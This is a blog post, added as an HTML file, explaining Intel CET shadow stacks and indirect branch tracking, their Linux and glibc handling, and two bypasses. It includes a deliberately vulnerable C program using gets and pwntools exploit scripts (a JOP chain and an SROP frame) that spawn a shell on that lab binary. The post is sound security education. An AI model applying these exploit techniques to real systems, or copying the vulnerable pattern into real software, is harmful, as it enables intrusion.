@@ -1,0 +1,372 @@
+<html>
+    <head>
+        <meta property="og:title" content="NSG650's blog">
+        <meta property="og:type" content="website">
+        <meta property="og:description" content="Out of control">
+        <meta property="og:image" content="https://nsg650.github.io/blogs/assets/22-4-2025/banner.png">
+        <meta property="theme-color" content="#650650">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="../res/style.css">
+        <title>Out of control</title>
+    </head>
+    <body>
+        <div class="center">
+            <h1>Out of control</h1>
+            <h4>Posted on 22-4-2025</h4>
+            <div>
+                <p>
+                    In today's age of binary exploitation, most exploits tend to make use of Return Oriented Programming to bypass No Execute (NX). 
+                    That might come to an end soon with the introduction of Intel CET which prevents such ROP and even JOP attacks. 
+                    This blog goes into what Intel CET is, how it functions and how one could possibly bypass it to still achieve arbitrary code execution.
+                </p>
+            </div>
+            <div>
+                <h2>Intel CET</h2>
+                <p>Intel CET (Control-flow Enforcement Technology) is a hardware feature present in Intel processors starting with Tigerlake which prevents attacks using ROP or JOP. 
+                    AMD processors too have an equivalent which is present starting with the Zen 3 architecture.
+                </p>
+                <p>Intel CET provides two mechanisms</p>
+                <p>-> Shadow stack: This prevents ROP attacks where a chain of return gadgets are placed on the stack to achieve code execution</p>
+                <p>-> Indirect branch tracking (IBT): This prevents JOP attacks where a chain of jump or call gadgets are used to achieve code execution</p>
+                <div>
+                    <h3>Shadow Stack</h3>
+                    <p>The shadow stack is another separate stack for the running program. Unlike the ordinary stack, it only keeps track of return addresses.</p>
+                    <div class="center">
+                        <table>
+                            <tr>
+                                <th>
+                                    <p style="font-size: 70%">
+                                        <img src="assets/22-4-2025/push_to_stack.png" alt="Push and pop operations only affect the stack"><br>
+                                        Push and pop operations only affect the stack
+                                    </p>
+                                </th>
+                                <th>
+                                    <p style="font-size: 70%">
+                                        <img src="assets/22-4-2025/call_push_to_stack.png" alt="Call and returns affect both the stack and the shadow stack"><br>
+                                        Call and returns affect both the stack and the shadow stack
+                                    </p>
+                                </th>
+                            </tr>
+                        </table>
+                    </div>
+                    <p>
+                        When a return occurs, the address is popped off the normal stack and the shadow stack and then compared. 
+                        If the addresses match, the return is executed as usual. 
+                        If the addresses don't match then the processor raises the Control Protection exception (#CP).
+                    </p>
+                    <div class="center">
+                        <table>
+                            <tr>
+                                <th>
+                                    <p style="font-size: 70%">
+                                        <img src="assets/22-4-2025/ret_passes.png" alt="Addresses match. Return executes."><br>
+                                        Addresses match. Return executes.
+                                    </p>
+                                </th>
+                                <th>
+                                    <p style="font-size: 70%">
+                                        <img src="assets/22-4-2025/ret_fails.png" alt="Call and returns affect both the stack and the shadow stack"><br>
+                                        Addresses do not match. #CP is thrown.
+                                    </p>
+                                </th>
+                            </tr>
+                        </table>
+                    </div>
+                    <p>
+                        Each shadow stack also has a special token associated with it. 
+                        This token is required for loading and restoring the shadow stack. 
+                        If the token on the shadow stack does not match with the one that is being used to restore the shadow stack then the #CP exception will be raised.
+                    </p>
+                    <p>
+                        The token is a 64 bit value and it's layout is as shown below
+                    </p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/shadow_token_layout.png" alt="Shadow Token layout"><br>
+                        Shadow Token layout
+                    </p>
+                    <p>The token is generated on <code>RSTORSSP</code> when the shadow stack is preserved and the <code>SAVEPREVSSP</code> pops off the token.</p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/shadow_stack_save_and_restore.png" alt="Shadow stack restore and save"><br>
+                        Shadow stack restore and save
+                    </p>
+                    <p>The shadow stack is set up when a new thread is started.</p>
+                </div>
+                <div>
+                    <h3>Indirect branch tracking</h3>
+                    <p>IBT works by checking if the address to which the jump or call is made has the instruction <code>ENDBR64</code> for long mode and <code>ENDBR32</code> for protected mode. 
+                        If the specific instruction is not found then the #CP exception is raised else the CPU continues execution as normal. 
+                        IBT is not enforced if the jump or call is made with the <code>notrack</code> prefix.</p>
+                    <div class="center">
+                        <table>
+                            <tr>
+                                <th>
+                                    <p style="font-size: 70%">
+                                        <img src="assets/22-4-2025/jump_passes.png" alt="Target has endbr instruction"><br>
+                                        Target has endbr instruction
+                                    </p>
+                                </th>
+                                <th>
+                                    <p style="font-size: 70%">
+                                        <img src="assets/22-4-2025/jump_fails.png" alt="Target does not have endbr instruction"><br>
+                                        Target does not have endbr instruction
+                                    </p>
+                                </th>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+                <div>
+                    <h2>Operating System side</h2>
+                    <p>I will look into Linux for this blog. Windows has supported CET for a longer while. I will look into Windows some other time.</p>
+                    <div>
+                        <h3>Enabling and management</h3>
+                        <p>CET is enabled using the <code>setup_cet</code> function in <code>arch/x86/kernel/cpu/common.c</code></p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/setup_cet.png" alt="setup_cet"><br>
+                            setup_cet
+                        </p>
+                        <p>
+                            The kernel enables shadow stacks for user mode and IBT for kernel mode.
+                            It does this by writing into the <code>MSR_IA32_[S/U]_CET</code> respectively.
+                        </p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/MSR_CET_Register.png" alt="IA32_CET MSR register"><br>
+                            IA32_CET MSR register
+                        </p>
+                        <p>
+                            For user mode the shadow stacks are enabled upon request by the process. 
+                            This is done since some libraries or programs may not support shadow stacks and might pull off things like retpolines which can cause CET to trigger. 
+                            The <code>shstk_setup</code> function in <code>arch/x86/kernel/shstk.c</code> sets up the shadow stack for user mode.
+                        </p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/shstk_setup.png" alt="Shadow stack setup"><br>
+                            Shadow stack setup
+                        </p>
+                        <p>
+                            Surprisingly IBT is not enabled for user mode. 
+                            I am guessing it is for <a href="https://lkml.org/lkml/2012/12/23/75">programs</a> that have not been updated to support IBT. 
+                            Code that is generated by older compilers do not insert the ENDBR instructions. 
+                            Enabling it would break older programs. 
+                            I am guessing that is the reason why it is not enabled.
+                        </p>
+                        <p>Finally the kernel enables CET by setting the 23rd bit of the CR4 register.</p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/cr4_register.png" alt="CR4 register"><br>
+                            CR4 register
+                        </p>
+                        <p>
+                            The Shadow Stack Pointer and settings for user CET are stored in the XSAVE area. 
+                            So the CET context is just managed like any other FPU context.
+                        </p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/cet_user_state.png" alt="cet_user_state structure"><br>
+                            cet_user_state structure
+                        </p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/XSAVE_area.png" alt="XSAVE context"><br>
+                            XSAVE context
+                        </p>
+                    </div>
+                    <div>
+                        <h3>Handling</h3>
+                        <p>The exception vector for CET generated faults is 21.</p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/exception_vector_table.png" alt="Exception vector table"><br>
+                            Exception vector table
+                        </p>
+                        <p>Linux defines a handler and based on whether the exception is generated from user mode or kernel mode, handles it appropriately.</p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/handle_cp_fault.png" alt="Control Protection exception handler"><br>
+                            Control Protection exception handler
+                        </p>
+                        <p>Interestingly it only checks for Shadow Stack for user mode and IBT for kernel mode generated exceptions.</p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/handle_user_cp_fault.png" alt="Userspace #CP exception handler"><br>
+                            Userspace #CP exception handler
+                        </p>
+                        <p>When the fault occurs it delivers a <code>SIGSEGV</code> signal to the userspace program.</p>
+                    </div>
+                    <div>
+                        <h3>Userspace</h3>
+                        <p>I will be looking at Glibc here since most Linux distributions use it.
+                            First on startup it checks whether the CPU supports IBT and Shadow Stack. 
+                            It is also possible to forcefully enable and disable CET through the <code>GLIBC_TUNABLES</code> environment variable.
+                        </p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/check_cet_at_startup.png" alt="Checking for CET support"><br>
+                            Checking for CET support
+                        </p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/get_cet_supported_features.png" alt="Getting the CET features supported"><br>
+                            Getting the CET features supported
+                        </p>
+                        <p>If CET is enabled then it gets the features supported and enables it while it is setting up the Thread Local Storage (TLS).</p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/setup_tls.png" alt="CET being enabled when the TLS is setup"><br>
+                            CET being enabled when the TLS is setup
+                        </p>
+                        <p>It makes the <code>arch_prctl</code> syscall to ask the kernel to enable shadow stacks for the running thread.</p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/enable_cet_user.png" alt="Macro that calls arch_prctl to enable CET"><br>
+                            Macro that calls arch_prctl to enable CET
+                        </p>
+                        <p>A new shadow stack is allocated using the <code>map_shadow_stack</code> syscall when a new thread is created.</p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/map_shadow_stack.png" alt="Shadow stack allocation function"><br>
+                            Shadow stack allocation function
+                        </p>
+                        <p>When a new thread is started the shadow stack is setup in <code>__start_context</code></p>
+                        <p style="font-size: 70%">
+                            <img src="assets/22-4-2025/start_thread_ctx.png" alt="Thread startup code"><br>
+                            Thread startup code
+                        </p>
+                        <p>
+                            The thread and its signal handlers make use of the same shadow stack. 
+                            When a signal occurs the process context is pushed on the stack and the shadow stack token is pushed on the shadow stack.
+                        </p>
+                    </div>
+                </div>
+                <div>
+                    <h2>Bypassing CET</h2>
+                    <p>As of now I could think of two ways in which CET can be bypassed.</p>
+                    <p>-> Using Jump Oriented Programming (JOP) since IBT is not enabled for userspace processes</p>
+                    <p>-> Using Sigreturn Oriented Programming (SROP)</p>
+                    <p>For testing I will be exploiting this simple C program</p>
+                    <pre>
+
+    #include &lt;stdio.h&gt;
+    #include &lt;stdint.h&gt;
+    #include &lt;stddef.h&gt;
+    #include &lt;stdlib.h&gt;
+
+    typedef void (*func_ptr_t)(uint64_t arg);
+
+    char *gets(char *str);
+
+    int main(void) {
+    	char buffer[512] = {0};
+    	func_ptr_t func = (func_ptr_t)puts;
+    	system("echo Hello there! What is your name?"); // So glibc would forcefully link in system as well
+    	gets(buffer);
+    	puts("Nice to meet you ");
+    	func((uint64_t)buffer);
+    	putchar('\n');
+    	return 0;
+    }
+                    </pre>
+                    <p>I compiled using the following command <code>gcc fun.c -o fun -fno-stack-protector -fcf-protection=return,branch -static</code></p>
+                    <p>The system I am running this on is Ultramarine Linux 41 running kernel version <code>6.13.10-200.fc41.x86_64</code>. The CPU used by the system is <code>11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz</code>.</p>
+                    <p>Note: I am aware that I can simply overwrite the function pointer to call <code>system</code> directly. The below two exploits are done only for demonstrating CET bypasses.</p>
+                </div>
+                <div>
+                    <h3>Method 1 Jump Oriented Programming</h3>
+                    <p>
+                        Since IBT is not enabled for userspace programs, it is possible to still achieve code execution using Jump Oriented Programming. 
+                        Now this is lame since we are not bypassing CET here but since IBT is not enabled we can make use of this.
+                    </p>
+                    <p>Some useful functions begin with the <code>endbr64</code> instruction which can be utilised for JOP.</p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/main_disassembly.png" alt="endbr instruction at the start of main"><br>
+                        endbr instruction at the start of main
+                    </p>
+                    <p>We can see the compiler has generated code with the <code>endbr64</code> instruction added at the start of every function.</p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/putchar_disassembly.png" alt="endbr instruction at the start of putchar"><br>
+                        endbr instruction at the start of putchar
+                    </p>
+                    <p>I setup a simple JOP chain using this interesting gadget.</p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/jop_gadget.png" alt="JOP gadget"><br>
+                        JOP gadget
+                    </p>
+                    <pre>
+        
+    from pwn import *
+
+    elf = context.binary = ELF("./fun")
+    p = process()
+    
+    payload = p64(0x404ee0)
+    payload += p64(0x47c725)
+    payload += b"A" * (512 - (8 * 2))
+    payload += p64(0x401960)
+    
+    p.sendline(payload)
+    p.interactive()                        
+                    </pre>
+                    <p>When the function pointer is called, its return address is pushed on to the stack. The gadget pops it into the rbx register. The pointer to system is then popped in rax and a pointer to /bin/sh is popped into rdi.
+                         Finally rax is called which makes this the equivalent of <code>system("/bin/sh")</code> giving us a shell.</p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/jop_flow.png" alt="JOP Exploit flow"><br>
+                        JOP Exploit flow
+                    </p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/jop_demo.png" alt="JOP Exploit flow"><br>
+                        JOP Exploit flow
+                    </p>
+                </div>
+                <div>
+                    <h3>Method 2 Sigreturn Oriented Programming</h3>
+                    <p>
+                        Sigreturn Oriented Programming leverages the use of the <code>sigreturn</code> syscall. 
+                        Unlike ROP where the CPU returns to the address placed on the stack, a context frame on the stack is loaded by the kernel and that becomes the new context for the CPU. 
+                        This allows for much more control over the CPU.
+                    </p>
+                    <p>
+                        Since the sigreturn context is not protected by CET it is possible to load our own context and then execute whatever code we want. 
+                        IBT is not enforced on signal handler entries which means it is possible to simply jump to <code>__restore_rt</code> which makes the sigreturn syscall.
+                    </p>
+                    <pre>
+
+    from pwn import *
+
+    elf = context.binary = ELF("./fun")
+    p = process()
+
+    context.arch = "amd64"
+    frame = SigreturnFrame()
+    frame.rax = 0x3b
+    frame.rip = 0x43bf97
+    frame.rdi = 0x47c725
+    frame.rsi = 0x0
+    frame.rdx = 0x0
+
+    payload = bytes(frame)[8:]
+    payload += b"A" * (512 - len(bytes(frame)) + 8)
+    payload += b"B" * 8
+    payload += p64(0x43bf90)
+
+    p.sendline(payload)
+    p.interactive()
+                    </pre>
+                    <p>Since the return address is pushed, we would have to skip the first register entry in the sigreturn frame. Thankfully it is a register that does not interfere with the final syscall we make to launch the shell.</p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/srop_flow.png" alt="SROP Exploit flow"><br>
+                        SROP Exploit flow
+                    </p>
+                    <p style="font-size: 70%">
+                        <img src="assets/22-4-2025/srop_demo.png" alt="SROP Exploit flow"><br>
+                        SROP Exploit flow
+                    </p>
+                </div>
+            </div>
+            <div>
+                <h2>Conclusion</h2>
+                <p>
+                    The introduction of Intel CET is a step forward in preventing binary exploitation attacks. 
+                    While it does not eliminate such attacks completely it does make such attacks harder. 
+                    My ideas for bypassing CET are not the only ones, there are more sophisticated ways to bypass CET such as using <a href="https://www.offsec.com/blog/bypassing-intel-cet-with-counterfeit-objects/">Counterfeit Object Oriented Programming</a> and possibly more to come in the future. 
+                    It is for sure that binary exploitation attacks will not be completely eradicated but with the rising popularity of memory safe languages like Rust and processor features like CET, it will become very rare in the future.
+                </p>
+            </div>
+            <div>
+                <h2>Credits</h2>
+                <a href="https://windows-internals.com/cet-on-windows/">-> Windows Internal's look at CET in Windows</a><br>
+                <a href="https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Sun-How-to-Survive-the-Hardware-Assisted-Control-Flow-Integrity-Enforcement.pdf">-> How to Survive the Hardware-assisted Control-flow Integrity Enforcement</a><br>
+                <a href="https://www.offsec.com/blog/bypassing-intel-cet-with-counterfeit-objects/">-> Bypassing CET using Counterfeit Object Oriented Programming</a><br>
+                <a href="https://lpc.events/event/7/contributions/729/attachments/496/903/CET-LPC-2020.pdf">-> Intel's presentation for CET in Linux</a><br>
+                <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">-> Intel Software Development Manual</a><br>
+                <a href="https://docs.kernel.org/next/x86/shstk.html">-> Linux docs on Shadow Stack</a><br>
+            </div>
+        </div>
+    </body>
